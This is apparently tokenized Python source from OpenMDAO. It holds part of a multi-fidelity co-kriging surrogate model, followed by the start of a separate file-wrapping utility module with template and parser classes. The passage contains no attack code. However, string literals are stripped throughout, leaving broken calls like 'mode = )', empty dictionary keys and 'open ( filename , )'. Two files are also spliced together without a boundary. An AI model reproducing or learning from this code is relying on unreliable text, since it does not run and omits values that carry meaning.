~~~ """\nThis function determines the BLUP parameters and evaluates the negative reduced\nlikelihood function for the given autocorrelation parameters theta.\n\nMaximizing this function wrt the autocorrelation parameters theta is\nequivalent to maximizing the likelihood of the assumed joint Gaussian\ndistribution of the observations y evaluated onto the design of\nexperiments X.\n\nArgs\n----\n\nself: Multi-Fidelity Co-Kriging object\n\nlvl: Integer\n    Level of fidelity\n\ntheta: array_like, optional\n    An array containing the autocorrelation parameters at which the\n    Gaussian Process model parameters should be determined.\n    Default uses the built-in autocorrelation parameters\n    (ie ``theta = self.theta``).\n\nReturns\n-------\n\nrlf_value: double\n    The value of the negative concentrated reduced likelihood function\n    associated to the given autocorrelation parameters theta.\n""" \n 
\n 
if theta is None : \n 
# Use built-in autocorrelation parameters \n 
~~~ theta = self . theta [ lvl ] \n 
\n 
# Initialize output \n 
~~ rlf_value = 1e20 \n 
\n 
# Retrieve data \n 
n_samples = self . n_samples [ lvl ] \n 
y = self . y [ lvl ] \n 
F = self . F [ lvl ] \n 
p = self . p [ lvl ] \n 
q = self . q [ lvl ] \n 
\n 
R = self . _build_R ( lvl , theta ) \n 
\n 
try : \n 
~~~ C = linalg . cholesky ( R , lower = True ) \n 
~~ except linalg . LinAlgError : \n 
~~~ _logger . warning ( ( % lvl ) + \n 
+ str ( theta ) ) \n 
return rlf_value \n 
\n 
# Get generalized least squares solution \n 
~~ Ft = solve_triangular ( C , F , lower = True ) \n 
Yt = solve_triangular ( C , y , lower = True ) \n 
try : \n 
~~~ Q , G = linalg . qr ( Ft , econ = True ) \n 
~~ except : \n 
# DeprecationWarning: qr econ argument will be removed after scipy \n 
# 0.7. The economy transform will then be available through the \n 
\n 
~~~ Q , G = linalg . qr ( Ft , mode = ) \n 
pass \n 
\n 
# Universal Kriging \n 
~~ beta = solve_triangular ( G , np . dot ( Q . T , Yt ) ) \n 
\n 
err = Yt - np . dot ( Ft , beta ) \n 
err2 = np . dot ( err . T , err ) [ 0 , 0 ] \n 
self . _err = err \n 
sigma2 = err2 / ( n_samples - p - q ) \n 
detR = ( ( np . diag ( C ) ) ** ( 2. / n_samples ) ) . prod ( ) \n 
\n 
rlf_value = ( n_samples - p - q ) * np . log10 ( sigma2 ) + n_samples * np . log10 ( detR ) \n 
\n 
self . beta_rho [ lvl ] = beta [ : q ] \n 
self . beta_regr [ lvl ] = beta [ q : ] \n 
self . beta [ lvl ] = beta \n 
self . sigma2 [ lvl ] = sigma2 \n 
self . C [ lvl ] = C \n 
self . G [ lvl ] = G \n 
\n 
return rlf_value \n 
\n 
\n 
~~ def _max_rlf ( self , lvl , initial_range , tol ) : \n 
~~~ """\nThis function estimates the autocorrelation parameter theta\nas the maximizer of the reduced likelihood function of the given level (lvl).\n(Minimization of the negative reduced likelihood function is used for convenience.)\n\nArgs\n----\n\nself: Most parameters are stored in the Gaussian Process model object.\n\nlvl: integer\n    Level of fidelity\n\ninitial_range: float\n    Initial range of the optimizer\n\ntol: float\n    Optimizer terminates when the tolerance tol is reached.\n\nReturns\n-------\n\noptimal_theta: array_like\noptimal_rlf_value: double\n    The optimal negative reduced likelihood function value.\n\nres: dict\n    res[\'theta\']: optimal theta\n    res[\'rlf_value\']: optimal value for likelihood\n""" \n 
# Initialize input \n 
thetaL = self . thetaL [ lvl ] \n 
thetaU = self . thetaU [ lvl ] \n 
\n 
def rlf_transform ( x ) : \n 
~~~ return self . rlf ( theta = 10. ** x , lvl = lvl ) \n 
\n 
# Use specified starting point as first guess \n 
~~ theta0 = self . theta0 [ lvl ] \n 
x0 = np . log10 ( theta0 [ 0 ] ) \n 
\n 
constraints = [ ] \n 
for i in range ( theta0 . size ) : \n 
~~~ constraints . append ( { : , : lambda log10t , i = i : \n 
log10t [ i ] - np . log10 ( thetaL [ 0 ] [ i ] ) } ) \n 
constraints . append ( { : , : lambda log10t , i = i : \n 
np . log10 ( thetaU [ 0 ] [ i ] ) - log10t [ i ] } ) \n 
\n 
~~ constraints = tuple ( constraints ) \n 
sol = minimize ( rlf_transform , x0 , method = , \n 
constraints = constraints , \n 
options = { : initial_range , \n 
: tol , : 0 } ) \n 
\n 
log10_optimal_x = sol [ ] \n 
optimal_rlf_value = sol [ ] \n 
self . _nfev += sol [ ] \n 
\n 
optimal_theta = 10. ** log10_optimal_x \n 
\n 
res = { } \n 
res [ ] = optimal_theta \n 
res [ ] = optimal_rlf_value \n 
\n 
return res \n 
\n 
\n 
~~ def predict ( self , X , eval_MSE = True ) : \n 
~~~ """\nThis function performs the predictions of the kriging model on X.\n\nArgs\n----\n\nX: array_like\n    An array with shape (n_eval, n_features) giving the point(s) at\n    which the prediction(s) should be made.\n\neval_MSE: boolean, optional\n    A boolean specifying whether the Mean Squared Error should be\n    evaluated or not. Default assumes evalMSE is True.\n\nReturns\n-------\n\ny: array_like\n    An array with shape (n_eval, ) with the Best Linear Unbiased\n    Prediction at X. If all_levels is set to True, an array\n    with shape (n_eval, nlevel) giving the BLUP for all levels.\n\nMSE: array_like, optional (if eval_MSE is True)\n    An array with shape (n_eval, ) with the Mean Squared Error at X.\n    If all_levels is set to True, an array with shape (n_eval, nlevel)\n    giving the MSE for all levels.\n""" \n 
\n 
X = array2d ( X ) \n 
nlevel = self . nlevel \n 
n_eval , n_features_X = X . shape \n 
\n 
# Calculate kriging mean and variance at level 0 \n 
mu = np . zeros ( ( n_eval , nlevel ) ) \n 
\n 
f = self . regr ( X ) \n 
f0 = self . regr ( X ) \n 
dx = l1_cross_distances ( X , Y = self . X [ 0 ] ) \n 
\n 
# Get regression function and correlation \n 
F = self . F [ 0 ] \n 
C = self . C [ 0 ] \n 
\n 
beta = self . beta [ 0 ] \n 
Ft = solve_triangular ( C , F , lower = True ) \n 
yt = solve_triangular ( C , self . y [ 0 ] , lower = True ) \n 
r_ = self . corr ( self . theta [ 0 ] , dx ) . reshape ( n_eval , self . n_samples [ 0 ] ) \n 
gamma = solve_triangular ( C . T , yt - np . dot ( Ft , beta ) , lower = False ) \n 
\n 
# Scaled predictor \n 
mu [ : , 0 ] = ( np . dot ( f , beta ) + np . dot ( r_ , gamma ) ) . ravel ( ) \n 
\n 
if eval_MSE : \n 
~~~ self . sigma2_rho = nlevel * [ None ] \n 
MSE = np . zeros ( ( n_eval , nlevel ) ) \n 
r_t = solve_triangular ( C , r_ . T , lower = True ) \n 
G = self . G [ 0 ] \n 
\n 
u_ = solve_triangular ( G . T , f . T - np . dot ( Ft . T , r_t ) , lower = True ) \n 
MSE [ : , 0 ] = self . sigma2 [ 0 ] * ( 1 - ( r_t ** 2 ) . sum ( axis = 0 ) + ( u_ ** 2 ) . sum ( axis = 0 ) ) \n 
\n 
# Calculate recursively kriging mean and variance at level i \n 
~~ for i in range ( 1 , nlevel ) : \n 
~~~ C = self . C [ i ] \n 
F = self . F [ i ] \n 
g = self . rho_regr ( X ) \n 
dx = l1_cross_distances ( X , Y = self . X [ i ] ) \n 
r_ = self . corr ( self . theta [ i ] , dx ) . reshape ( n_eval , self . n_samples [ i ] ) \n 
f = np . vstack ( ( g . T * mu [ : , i - 1 ] , f0 . T ) ) \n 
\n 
Ft = solve_triangular ( C , F , lower = True ) \n 
yt = solve_triangular ( C , self . y [ i ] , lower = True ) \n 
r_t = solve_triangular ( C , r_ . T , lower = True ) \n 
G = self . G [ i ] \n 
beta = self . beta [ i ] \n 
\n 
# scaled predictor \n 
mu [ : , i ] = ( np . dot ( f . T , beta ) + np . dot ( r_t . T , yt - np . dot ( Ft , beta ) ) ) . ravel ( ) \n 
\n 
if eval_MSE : \n 
~~~ Q_ = ( np . dot ( ( yt - np . dot ( Ft , beta ) ) . T , yt - np . dot ( Ft , beta ) ) ) [ 0 , 0 ] \n 
u_ = solve_triangular ( G . T , f - np . dot ( Ft . T , r_t ) , lower = True ) \n 
sigma2_rho = np . dot ( g , self . sigma2 [ i ] * linalg . inv ( np . dot ( G . T , G ) ) [ : self . q [ i ] , : self . q [ i ] ] + np . dot ( beta [ : self . q [ i ] ] , beta [ : self . q [ i ] ] . T ) ) \n 
sigma2_rho = ( sigma2_rho * g ) . sum ( axis = 1 ) \n 
\n 
MSE [ : , i ] = sigma2_rho * MSE [ : , i - 1 ] + Q_ / ( 2 * ( self . n_samples [ i ] - self . p [ i ] - self . q [ i ] ) ) * ( 1 - ( r_t ** 2 ) . sum ( axis = 0 ) ) + self . sigma2 [ i ] * ( u_ ** 2 ) . sum ( axis = 0 ) \n 
\n 
# scaled predictor \n 
~~ ~~ for i in range ( nlevel ) : # Predictor \n 
~~~ mu [ : , i ] = self . y_mean + self . y_std * mu [ : , i ] \n 
if eval_MSE : \n 
~~~ MSE [ : , i ] = self . y_std ** 2 * MSE [ : , i ] \n 
\n 
~~ ~~ if eval_MSE : \n 
~~~ return mu [ : , - 1 ] . reshape ( ( n_eval , 1 ) ) , MSE [ : , - 1 ] . reshape ( ( n_eval , 1 ) ) \n 
~~ else : \n 
~~~ return mu [ : , - 1 ] . reshape ( ( n_eval , 1 ) ) \n 
\n 
\n 
~~ ~~ def _check_list_structure ( self , X , y ) : \n 
\n 
~~~ if type ( X ) is not list : \n 
~~~ nlevel = 1 \n 
X = [ X ] \n 
~~ else : \n 
~~~ nlevel = len ( X ) \n 
\n 
\n 
~~ if type ( y ) is not list : \n 
~~~ y = [ y ] \n 
\n 
~~ if len ( X ) != len ( y ) : \n 
~~~ raise ValueError ( "X and y must have the same length." ) \n 
\n 
~~ n_samples = np . zeros ( nlevel , dtype = int ) \n 
n_features = np . zeros ( nlevel , dtype = int ) \n 
n_samples_y = np . zeros ( nlevel , dtype = int ) \n 
for i in range ( nlevel ) : \n 
~~~ n_samples [ i ] , n_features [ i ] = X [ i ] . shape \n 
if i > 1 and n_features [ i ] != n_features [ i - 1 ] : \n 
~~~ raise ValueError ( "All X must have the same number of columns." ) \n 
~~ y [ i ] = np . asarray ( y [ i ] ) . ravel ( ) [ : , np . newaxis ] \n 
n_samples_y [ i ] = y [ i ] . shape [ 0 ] \n 
if n_samples [ i ] != n_samples_y [ i ] : \n 
~~~ raise ValueError ( "X and y must have the same number of rows." ) \n 
\n 
~~ ~~ self . n_features = n_features [ 0 ] \n 
\n 
if type ( self . theta ) is not list : \n 
~~~ self . theta = nlevel * [ self . theta ] \n 
~~ elif len ( self . theta ) != nlevel : \n 
~~~ raise ValueError ( "theta must be a list of %d element(s)." % nlevel ) \n 
\n 
~~ if type ( self . theta0 ) is not list : \n 
~~~ self . theta0 = nlevel * [ self . theta0 ] \n 
~~ elif len ( self . theta0 ) != nlevel : \n 
~~~ raise ValueError ( "theta0 must be a list of %d elements." % nlevel ) \n 
\n 
~~ if type ( self . thetaL ) is not list : \n 
~~~ self . thetaL = nlevel * [ self . thetaL ] \n 
~~ elif len ( self . thetaL ) != nlevel : \n 
~~~ raise ValueError ( "thetaL must be a list of %d elements." % nlevel ) \n 
\n 
~~ if type ( self . thetaU ) is not list : \n 
~~~ self . thetaU = nlevel * [ self . thetaU ] \n 
~~ elif len ( self . thetaU ) != nlevel : \n 
~~~ raise ValueError ( "thetaU must be a list of %d elements." % nlevel ) \n 
\n 
~~ self . nlevel = nlevel \n 
self . X = X [ : ] \n 
self . y = y [ : ] \n 
self . n_samples = n_samples \n 
\n 
return \n 
\n 
\n 
~~ def _check_params ( self ) : \n 
\n 
# Check regression model \n 
~~~ if not callable ( self . regr ) : \n 
~~~ if self . regr in self . _regression_types : \n 
~~~ self . regr = self . _regression_types [ self . regr ] \n 
~~ else : \n 
~~~ raise ValueError ( "regr should be one of %s or callable, " \n 
"%s was given." \n 
% ( self . _regression_types . keys ( ) , self . regr ) ) \n 
\n 
# Check rho regression model \n 
~~ ~~ if not callable ( self . rho_regr ) : \n 
~~~ if self . rho_regr in self . _regression_types : \n 
~~~ self . rho_regr = self . _regression_types [ self . rho_regr ] \n 
~~ else : \n 
~~~ raise ValueError ( "rho_regr should be one of %s or callable, " \n 
"%s was given." \n 
% ( self . _regression_types . keys ( ) , self . rho_regr ) ) \n 
\n 
~~ ~~ for i in range ( self . nlevel ) : \n 
# Check correlation parameters \n 
~~~ if self . theta [ i ] is not None : \n 
~~~ self . theta [ i ] = array2d ( self . theta [ i ] ) \n 
if np . any ( self . theta [ i ] <= 0 ) : \n 
~~~ raise ValueError ( "theta0 must be strictly positive." ) \n 
\n 
~~ ~~ if self . theta0 [ i ] is not None : \n 
~~~ self . theta0 [ i ] = array2d ( self . theta0 [ i ] ) \n 
if np . any ( self . theta0 [ i ] <= 0 ) : \n 
~~~ raise ValueError ( "theta0 must be strictly positive." ) \n 
~~ ~~ else : \n 
~~~ self . theta0 [ i ] = array2d ( self . n_features * [ THETA0_DEFAULT ] ) \n 
\n 
~~ lth = self . theta0 [ i ] . size \n 
\n 
if self . thetaL [ i ] is not None : \n 
~~~ self . thetaL [ i ] = array2d ( self . thetaL [ i ] ) \n 
if self . thetaL [ i ] . size != lth : \n 
~~~ raise ValueError ( "theta0 and thetaL must have the " \n 
"same length." ) \n 
~~ ~~ else : \n 
~~~ self . thetaL [ i ] = array2d ( self . n_features * [ THETAL_DEFAULT ] ) \n 
\n 
~~ if self . thetaU [ i ] is not None : \n 
~~~ self . thetaU [ i ] = array2d ( self . thetaU [ i ] ) \n 
if self . thetaU [ i ] . size != lth : \n 
~~~ raise ValueError ( "theta0 and thetaU must have the " \n 
"same length." ) \n 
~~ ~~ else : \n 
~~~ self . thetaU [ i ] = array2d ( self . n_features * [ THETAU_DEFAULT ] ) \n 
\n 
~~ if np . any ( self . thetaL [ i ] <= 0 ) or np . any ( self . thetaU [ i ] < self . thetaL [ i ] ) : \n 
~~~ raise ValueError ( "The bounds must satisfy O < thetaL <= " \n 
"thetaU." ) \n 
\n 
~~ ~~ return \n 
\n 
\n 
~~ ~~ class MultiFiCoKrigingSurrogate ( MultiFiSurrogateModel ) : \n 
~~~ """\n    OpenMDAO adapter of multi-fidelity recursive cokriging method described\n    in [LeGratiet2013]. See MultiFiCoKriging class.\n    """ \n 
\n 
def __init__ ( self , regr = , rho_regr = , \n 
theta = None , theta0 = None , thetaL = None , thetaU = None , \n 
tolerance = TOLERANCE_DEFAULT , initial_range = INITIAL_RANGE_DEFAULT ) : \n 
~~~ super ( MultiFiCoKrigingSurrogate , self ) . __init__ ( ) \n 
\n 
self . tolerance = tolerance \n 
self . initial_range = initial_range \n 
self . model = MultiFiCoKriging ( regr = regr , rho_regr = rho_regr , theta = theta , \n 
theta0 = theta0 , thetaL = thetaL , thetaU = thetaU ) \n 
\n 
~~ def predict ( self , new_x ) : \n 
~~~ """Calculates a predicted value of the response based on the current\n        trained model for the supplied list of inputs.\n        """ \n 
Y_pred , MSE = self . model . predict ( [ new_x ] ) \n 
return Y_pred , np . sqrt ( np . abs ( MSE ) ) \n 
\n 
~~ def train_multifi ( self , X , Y ) : \n 
~~~ """Train the surrogate model with the given set of inputs and outputs.\n        """ \n 
X , Y = self . _fit_adapter ( X , Y ) \n 
self . model . fit ( X , Y , tol = self . tolerance , initial_range = self . initial_range ) \n 
\n 
~~ def _fit_adapter ( self , X , Y ) : \n 
# Manage special case with one fidelity \n 
# where can be called as [[xval1],[xval2]] instead of [[[xval1],[xval2]]] \n 
# we detect if shape(X[0]) is like (m,) instead of (m, n) \n 
~~~ if len ( np . shape ( np . array ( X [ 0 ] ) ) ) == 1 : \n 
~~~ X = [ X ] \n 
Y = [ Y ] \n 
\n 
~~ X = [ np . array ( x ) for x in reversed ( X ) ] \n 
Y = [ np . array ( y ) for y in reversed ( Y ) ] \n 
return ( X , Y ) \n 
\n 
\n 
~~ ~~ class FloatMultiFiCoKrigingSurrogate ( MultiFiCoKrigingSurrogate ) : \n 
~~~ """Predictions are returned as floats, which are the mean of the\n    NormalDistribution predicted by the base class model.""" \n 
\n 
def predict ( self , new_x ) : \n 
~~~ dist = super ( FloatMultiFiCoKrigingSurrogate , self ) . predict ( new_x ) \n 
return dist . mu \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ import doctest \n 
doctest . testmod ( ) \n 
~~ """\nA collection of utilities for file wrapping.\n\nNote: This is a work in progress.\n""" \n 
\n 
from __future__ import print_function \n 
\n 
import re \n 
from six . moves import range \n 
\n 
from pyparsing import CaselessLiteral , Combine , OneOrMore , Optional , TokenConverter , Word , nums , oneOf , printables , ParserElement , alphanums \n 
\n 
import numpy as np \n 
\n 
#public symbols \n 
__all__ = [ , ] \n 
\n 
\n 
def _getformat ( val ) : \n 
# Returns the output format for a floating point number. \n 
# The general format is used with 16 places of accuracy, except for when \n 
# the floating point value is an integer, in which case a decimal point \n 
# followed by a single zero is used. \n 
\n 
~~~ if int ( val ) == val : \n 
~~~ return "%.1f" \n 
~~ else : \n 
~~~ return "%.16g" \n 
\n 
\n 
~~ ~~ class _SubHelper ( object ) : \n 
~~~ """Replaces file text at the correct word location in a line. This\n    class contains the Helper Function that is passed to re.sub, etc.""" \n 
\n 
def __init__ ( self ) : \n 
\n 
~~~ self . newtext = "" \n 
self . replace_location = 0 \n 
self . current_location = 0 \n 
self . counter = 0 \n 
self . start_location = 0 \n 
self . end_location = 0 \n 
\n 
~~ def set ( self , newtext , location ) : \n 
~~~ """Sets a new word location and value for replacement.""" \n 
\n 
self . newtext = newtext \n 
self . replace_location = location \n 
self . current_location = 0 \n 
\n 
~~ def set_array ( self , newtext , start_location , end_location ) : \n 
~~~ """For an array, sets a new starting location, ending location, and\n        value for replacement.""" \n 
\n 
self . newtext = newtext \n 
self . start_location = start_location \n 
self . end_location = end_location \n 
self . current_location = 0 \n 
\n 
~~ def replace ( self , text ) : \n 
~~~ """This function should be passed to re.sub.\n        Outputs newtext if current_location = replace_location\n        Otherwise, outputs the input text.""" \n 
\n 
self . current_location += 1 \n 
\n 
if self . current_location == self . replace_location : \n 
~~~ if isinstance ( self . newtext , float ) : \n 
~~~ return _getformat ( self . newtext ) % self . newtext \n 
~~ else : \n 
~~~ return str ( self . newtext ) \n 
~~ ~~ else : \n 
~~~ return text . group ( ) \n 
\n 
~~ ~~ def replace_array ( self , text ) : \n 
~~~ """This function should be passed to re.sub.\n        Outputs newtext if current_location = replace_location\n        Otherwise, outputs the input text.""" \n 
\n 
self . current_location += 1 \n 
end = len ( self . newtext ) \n 
\n 
if self . current_location >= self . start_location and self . current_location <= self . end_location and self . counter < end : \n 
~~~ if isinstance ( self . newtext [ self . counter ] , float ) : \n 
~~~ val = self . newtext [ self . counter ] \n 
newval = _getformat ( val ) % val \n 
~~ else : \n 
~~~ newval = str ( self . newtext [ self . counter ] ) \n 
~~ self . counter += 1 \n 
return newval \n 
~~ else : \n 
~~~ return text . group ( ) \n 
\n 
\n 
~~ ~~ ~~ class ToInteger ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into an int.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into an integer.""" \n 
return int ( tokenlist [ 0 ] ) \n 
\n 
\n 
~~ ~~ class ToFloat ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into a float.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into a float.""" \n 
return float ( tokenlist [ 0 ] . replace ( , ) ) \n 
\n 
\n 
~~ ~~ class ToNan ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into Python nan.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into Python nan.""" \n 
return float ( ) \n 
\n 
\n 
~~ ~~ class ToInf ( TokenConverter ) : \n 
~~~ """Converter for PyParsing that is used to turn a token into Python inf.""" \n 
def postParse ( self , instring , loc , tokenlist ) : \n 
~~~ """Converter to make token into Python inf.""" \n 
return float ( ) \n 
\n 
\n 
~~ ~~ class InputFileGenerator ( object ) : \n 
~~~ """Utility to generate an input file from a template.\n    Substitution of values is supported. Data is located with\n    a simple API.""" \n 
\n 
def __init__ ( self ) : \n 
\n 
~~~ self . template_filename = [ ] \n 
self . output_filename = [ ] \n 
\n 
self . delimiter = " " \n 
self . reg = re . compile ( ) \n 
\n 
self . data = [ ] \n 
self . current_row = 0 \n 
self . anchored = False \n 
\n 
~~ def set_template_file ( self , filename ) : \n 
~~~ """Set the name of the template file to be used The template\n        file is also read into memory when this method is called.\n\n        Args\n        ----\n        filename : string\n            Name of the template file to be used.""" \n 
\n 
self . template_filename = filename \n 
\n 
templatefile = open ( filename , ) \n 
self . data = templatefile . readlines ( ) \n 
templatefile . close ( ) \n 
\n 
~~ def set_generated_file ( self , filename ) : \n 
~~~ """Set the name of the file that will be generated.\n\n        Args\n        ----\n        filename : string\n            Name of the input file to be generated.""" \n 
\n 
self . output_filename = filename \n 
\n 
~~ def set_delimiters ( self , delimiter ) : \n 
~~~ """Lets you change the delimiter that is used to identify field\n        boundaries.\n\n        Args\n        ----\n        delimiter : str\n            A string containing characters to be used as delimiters.""" \n 
\n 
self . delimiter = delimiter \n 
self . reg = re . compile ( + delimiter + ) \n 
\n 
~~ def mark_anchor ( self , anchor , occurrence = 1 ) : \n 
~~~ """Marks the location of a landmark, which lets you describe data by\n        relative position. Note that a forward search begins at the old anchor\n        location. If you want to restart the search for the anchor at the file\n        beginning, then call ``reset_anchor()`` before ``mark_anchor``.\n\n        Args\n        ----\n        anchor : string\n            The text you want to search for.\n\n        occurrence : integer, optional\n            Find nth instance of text; default is 1 (first). Use -1 to\n            find last occurrence. Reverse searches always start at the end\n            of the file no matter the state of any previous anchor.""" \n 
\n 
if not isinstance ( occurrence , int ) : \n 
~~~ raise ValueError ( "The value for occurrence must be an integer" ) \n 
\n 
~~ instance = 0 \n 
if occurrence > 0 : \n 
~~~ count = 0 \n 
max_lines = len ( self . data ) \n 
for index in range ( self . current_row , max_lines ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only after the anchor. \n 
if count == 0 and self . anchored : \n 
~~~ line = line . split ( anchor ) [ - 1 ] \n 
\n 
~~ if line . find ( anchor ) > - 1 : \n 
\n 
~~~ instance += 1 \n 
if instance == occurrence : \n 
~~~ self . current_row += count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count += 1 \n 
\n 
~~ ~~ elif occurrence < 0 : \n 
~~~ max_lines = len ( self . data ) - 1 \n 
count = max_lines \n 
for index in range ( max_lines , - 1 , - 1 ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only before the anchor. \n 
if count == max_lines and self . anchored : \n 
~~~ line = line . split ( anchor ) [ 0 ] \n 
\n 
~~ if line . find ( anchor ) > - 1 : \n 
~~~ instance += - 1 \n 
if instance == occurrence : \n 
~~~ self . current_row = count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count -= 1 \n 
~~ ~~ else : \n 
~~~ raise ValueError ( "0 is not valid for an anchor occurrence." ) \n 
\n 
~~ raise RuntimeError ( "Could not find pattern %s in template file %s" % ( anchor , self . template_filename ) ) \n 
\n 
~~ def reset_anchor ( self ) : \n 
~~~ """Resets anchor to the beginning of the file.""" \n 
\n 
self . current_row = 0 \n 
self . anchored = False \n 
\n 
~~ def transfer_var ( self , value , row , field ) : \n 
~~~ """Changes a single variable in the template relative to the\n        current anchor.\n\n        Args\n        ----\n        value : float, integer, bool, string\n            New value to set at the location.\n\n        row : integer\n            Number of lines offset from anchor line (0 is anchor line).\n            This can be negative.\n\n        field : integer\n            Which word in line to replace, as denoted by delimiter(s)\n        """ \n 
\n 
j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
sub = _SubHelper ( ) \n 
sub . set ( value , field ) \n 
newline = re . sub ( self . reg , sub . replace , line ) \n 
\n 
self . data [ j ] = newline \n 
\n 
~~ def transfer_array ( self , value , row_start , field_start , field_end , \n 
row_end = None , sep = ", " ) : \n 
~~~ """Changes the values of an array in the template relative to the\n        current anchor. This should generally be used for one-dimensional\n        or free form arrays.\n\n        Args\n        ----\n        value : float, integer, bool, str\n            Array of values to insert.\n\n        row_start : integer\n            Starting row for inserting the array. This is relative\n            to the anchor, and can be negative.\n\n        field_start : integer\n            Starting field in the given row_start as denoted by\n            delimiter(s).\n\n        field_end : integer\n            The final field the array uses in row_end.\n            We need this to figure out if the template is too small or large\n\n        row_end : integer, optional\n            Use if the array wraps to cover additional lines.\n\n        sep : integer, optional\n            Separator to use if we go beyond the template.""" \n 
\n 
# Simplified input for single-line arrays \n 
if row_end is None : \n 
~~~ row_end = row_start \n 
\n 
~~ sub = _SubHelper ( ) \n 
for row in range ( row_start , row_end + 1 ) : \n 
\n 
~~~ j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
if row == row_end : \n 
~~~ f_end = field_end \n 
~~ else : \n 
~~~ f_end = 99999 \n 
~~ sub . set_array ( value , field_start , f_end ) \n 
field_start = 0 \n 
\n 
newline = re . sub ( self . reg , sub . replace_array , line ) \n 
self . data [ j ] = newline \n 
\n 
# Sometimes an array is too large for the example in the template \n 
# This is resolved by adding more fields at the end \n 
~~ if sub . counter < len ( value ) : \n 
~~~ for val in value [ sub . counter : ] : \n 
~~~ newline = newline . rstrip ( ) + sep + str ( val ) \n 
\n 
~~ self . data [ j ] = newline \n 
\n 
# Sometimes an array is too small for the template \n 
# This is resolved by removing fields \n 
~~ elif sub . counter > len ( value ) : \n 
\n 
# TODO - Figure out how to handle this. \n 
\n 
~~~ raise ValueError ( "Array is too small for the template." ) \n 
\n 
~~ self . data [ j ] += "\\n" \n 
\n 
~~ def transfer_2Darray ( self , value , row_start , row_end , field_start , \n 
field_end ) : \n 
~~~ """Changes the values of a 2D array in the template relative to the\n        current anchor. This method is specialized for 2D arrays, where each\n        row of the array is on its own line.\n\n        Args\n        ----\n        value : ndarray\n            Array of values to insert.\n\n        row_start : integer\n            Starting row for inserting the array. This is relative\n            to the anchor, and can be negative.\n\n        row_end : integer\n            Final row for the array, relative to the anchor.\n\n        field_start : integer\n            starting field in the given row_start as denoted by\n            delimiter(s).\n\n        field_end : integer\n            The final field the array uses in row_end.\n            We need this to figure out if the template is too small or large.\n        """ \n 
\n 
sub = _SubHelper ( ) \n 
i = 0 \n 
for row in range ( row_start , row_end + 1 ) : \n 
\n 
~~~ j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
sub . set_array ( value [ i , : ] , field_start , field_end ) \n 
\n 
newline = re . sub ( self . reg , sub . replace_array , line ) \n 
self . data [ j ] = newline \n 
\n 
sub . current_location = 0 \n 
sub . counter = 0 \n 
i += 1 \n 
\n 
\n 
#        the template line \n 
\n 
~~ ~~ def clearline ( self , row ) : \n 
~~~ """Replace the contents of a row with the newline character.\n\n        Args\n        ----\n        row : integer\n            Row number to clear, relative to current anchor.""" \n 
\n 
self . data [ self . current_row + row ] = "\\n" \n 
\n 
~~ def generate ( self ) : \n 
~~~ """Use the template file to generate the input file.""" \n 
\n 
infile = open ( self . output_filename , ) \n 
infile . writelines ( self . data ) \n 
infile . close ( ) \n 
\n 
\n 
~~ ~~ class FileParser ( object ) : \n 
~~~ """Utility to locate and read data from a file.\n\n    Args\n    ----\n    end_of_line_comment_char : string, optional\n        Specify an end-of-line comment character to be ignored (e.g., Python\n        supports in-line comments with "#".)\n\n    full_line_comment_char : string, optional\n        Sepcify a comment character that signifies a line should be skipped.\n    """ \n 
\n 
def __init__ ( self , end_of_line_comment_char = None , full_line_comment_char = None ) : \n 
\n 
~~~ self . filename = [ ] \n 
self . data = [ ] \n 
\n 
self . delimiter = " \\t" \n 
self . end_of_line_comment_char = end_of_line_comment_char \n 
self . full_line_comment_char = full_line_comment_char \n 
\n 
self . current_row = 0 \n 
self . anchored = False \n 
self . set_delimiters ( self . delimiter ) \n 
\n 
~~ def set_file ( self , filename ) : \n 
~~~ """Set the name of the file that will be generated.\n\n        Args\n        ----\n        filename : string\n            Name of the input file to be generated.""" \n 
\n 
self . filename = filename \n 
\n 
inputfile = open ( filename , ) \n 
if not self . end_of_line_comment_char and not self . full_line_comment_char : \n 
~~~ self . data = inputfile . readlines ( ) \n 
~~ else : \n 
~~~ self . data = [ ] \n 
for line in inputfile : \n 
~~~ if line [ 0 ] == self . full_line_comment_char : \n 
~~~ continue \n 
~~ self . data . append ( line . split ( self . end_of_line_comment_char ) [ 0 ] ) \n 
~~ ~~ inputfile . close ( ) \n 
\n 
~~ def set_delimiters ( self , delimiter ) : \n 
~~~ """Lets you change the delimiter that is used to identify field\n        boundaries.\n\n        Args\n        ----\n        delimiter : string\n            A string containing characters to be used as delimiters. The\n            default value is \' \\t\', which means that spaces and tabs are not\n            taken as data but instead mark the boundaries. Note that the\n            parser is smart enough to recognize characters within quotes as\n            non-delimiters.""" \n 
\n 
self . delimiter = delimiter \n 
if delimiter != "columns" : \n 
~~~ ParserElement . setDefaultWhitespaceChars ( str ( delimiter ) ) \n 
~~ self . _reset_tokens ( ) \n 
\n 
~~ def mark_anchor ( self , anchor , occurrence = 1 ) : \n 
~~~ """Marks the location of a landmark, which lets you describe data by\n        relative position. Note that a forward search begins at the old anchor\n        location. If you want to restart the search for the anchor at the file\n        beginning, then call ``reset_anchor()`` before ``mark_anchor``.\n\n        Args\n        ----\n        anchor : str\n            The text you want to search for.\n\n        occurrence : integer\n            Find nth instance of text; default is 1 (first). Use -1 to\n            find last occurrence. Reverse searches always start at the end\n            of the file no matter the state of any previous anchor.""" \n 
\n 
if not isinstance ( occurrence , int ) : \n 
~~~ raise ValueError ( "The value for occurrence must be an integer" ) \n 
\n 
~~ instance = 0 \n 
if occurrence > 0 : \n 
~~~ count = 0 \n 
max_lines = len ( self . data ) \n 
for index in range ( self . current_row , max_lines ) : \n 
~~~ line = self . data [ index ] \n 
\n 
